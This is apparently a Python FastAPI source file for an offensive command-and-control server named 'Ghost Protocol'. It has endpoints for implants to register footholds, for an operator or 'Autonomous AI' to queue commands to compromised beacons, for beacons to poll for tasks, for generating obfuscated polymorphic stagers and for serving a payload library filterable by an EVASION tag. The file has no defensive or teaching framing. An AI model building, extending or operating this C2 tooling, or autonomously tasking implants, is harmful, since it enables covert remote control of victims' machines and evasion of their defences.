from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import Dict, Any, List, Optional
from app.modules.ghost.c2_server import ghost_c2

router = APIRouter()


class BeaconRegistration(BaseModel):
    beacon_id: str
    metadata: Dict[str, Any]


class TaskRequest(BaseModel):
    beacon_id: str
    command: str
    args: List[str] = []


@router.post("/register", tags=["Ghost Protocol - C2"])
async def register_implant(registration: BeaconRegistration):
    """
    Tier 5: Offensive Operations - Implant Registration.
    A deployed payload calls this endpoint to announce it has successfully established a foothold.
    """
    try:
        response = ghost_c2.register_beacon(registration.beacon_id, registration.metadata)
        return response
    except Exception as e:
        print(f"[GHOST PROTOCOL] Registration failure: {e}")
        raise HTTPException(status_code=500, detail="Implant channel failure.")


@router.post("/task", tags=["Ghost Protocol - C2"])
async def queue_implant_task(request: TaskRequest):
    """
    Operator or Autonomous AI queues an instruction (e.g., 'whoami', 'ls') for the beacon.
    """
    try:
        task = ghost_c2.task_beacon(request.beacon_id, request.command, request.args)
        return {"status": "QUEUED", "task": task}
    except ValueError as ve:
        raise HTTPException(status_code=404, detail=str(ve))
    except Exception as e:
        raise HTTPException(status_code=500, detail="Tasking failure.")


@router.get("/poll/{beacon_id}", tags=["Ghost Protocol - C2"])
async def poll_tasks(beacon_id: str):
    """
    The beacon periodically hits this endpoint to see if Vanguard has queued new commands.
    """
    tasks = ghost_c2.retrieve_tasks(beacon_id)
    return {"tasks": tasks}


@router.get("/stager/{platform}", tags=["Ghost Protocol - C2"])
async def generate_stager(platform: str):
    """
    Tier 5: Offensive Operations - Polymorphic Stager Generation.
    Returns an obfuscated payload to establish a C2 connection.
    """
    import uuid
    beacon_id = f"impl-{str(uuid.uuid4())[:8]}"
    try:
        stager_data = ghost_c2.generate_polymorphic_stager(beacon_id, platform)
        return {"status": "SUCCESS", "beacon_id": beacon_id, "stager_package": stager_data}
    except Exception as e:
        raise HTTPException(status_code=500, detail="Stager synthesis failure.")


@router.get("/sessions", tags=["Ghost Protocol - C2"])
async def get_active_sessions():
    """
    Returns all active C2 sessions stored in Redis.
    Sessions are registered when beacons call /ghost/register.
    Ephemeral — TTL-driven (sessions expire after beacon stop checking in).
    """
    import json
    try:
        import redis.asyncio as aioredis
        from app.core.config import settings
        r = aioredis.from_url(settings.REDIS_URL, decode_responses=True)
        keys = await r.keys("ghost:session:*")
        sessions = []
        for key in keys:
            raw = await r.get(key)
            if raw:
                try:
                    data = json.loads(raw)
                    sessions.append(data)
                except Exception:
                    pass
        await r.aclose()
        return {"sessions": sessions, "count": len(sessions)}
    except Exception as e:
        # Graceful degradation — Redis may not be running in dev
        return {"sessions": [], "count": 0, "warning": f"Redis unavailable: {str(e)}"}


@router.get("/payloads", tags=["Ghost Protocol - C2"])
async def get_payload_library(
    lang: Optional[str] = None,
    tag: Optional[str] = None,
):
    """
    Returns the payload library from the config_entries table.
    Replaces the hardcoded PAYLOADS array in the frontend Ghost Shell page.
    Supports optional ?lang=python and ?tag=EVASION filters.
    """
    try:
        from app.infrastructure.session import SessionLocal
        from app.models.config_model import ConfigEntry

        db = SessionLocal()
        try:
            query = db.query(ConfigEntry).filter(
                ConfigEntry.category == "ghost_payloads",
                ConfigEntry.is_active == True,
            )
            entries = query.all()

            payloads = []
            for e in entries:
                meta = e.value or {}
                if lang and meta.get("lang") != lang:
                    continue
                if tag and meta.get("tag") != tag:
                    continue
                payloads.append({
                    "id": e.key,
                    "name": e.label,
                    "lang": meta.get("lang", "python"),
                    "tag": meta.get("tag", "GENERAL"),
                    "color": meta.get("color", "text-slate-400"),
                    "code": meta.get("code", "# No code available"),
                    "description": e.description or "",
                })

            return {"payloads": payloads, "count": len(payloads)}
        finally:
            db.close()
    except Exception as e:
        return {"payloads": [], "count": 0, "warning": f"Payload library unavailable: {str(e)}"}

